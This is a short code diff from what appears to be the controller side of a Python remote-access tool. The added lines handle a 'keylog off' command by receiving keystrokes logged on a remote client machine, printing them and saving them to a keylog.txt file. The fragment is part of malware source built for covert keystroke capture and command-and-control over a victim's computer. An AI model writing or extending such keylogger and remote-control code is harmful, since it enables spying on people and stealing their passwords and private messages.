@@ -422,7 +422,21 @@ def send_commands():
 
         elif strChoice == '--k 0' or strChoice == 'keylog off':
             send(b'keylogoff')
-            # print(decode_utf8(recv(intBuff)))
+
+            # First Receive len of logged keys
+            resultLen = int(decode_utf8(recv(intBuff)))
+            resultLen = int(resultLen)
+
+            # Scond Receive logged keys
+            loggedKeys = decode_utf8(recvall(resultLen))
+
+            print(f"{fColors.GREEN}\n[+] Key Logging Stopped. All Logged keys saved into 'keylog.txt' file. "
+                  f"Logged Keys:\n{fColors.LIGHT_WHITE}{loggedKeys}")
+
+
+            with open('keylog.txt', 'w') as f:
+                f.write(loggedKeys)
+
 
 
         # --x or exit: Command for Close Server, Client and Connection in Command MODE
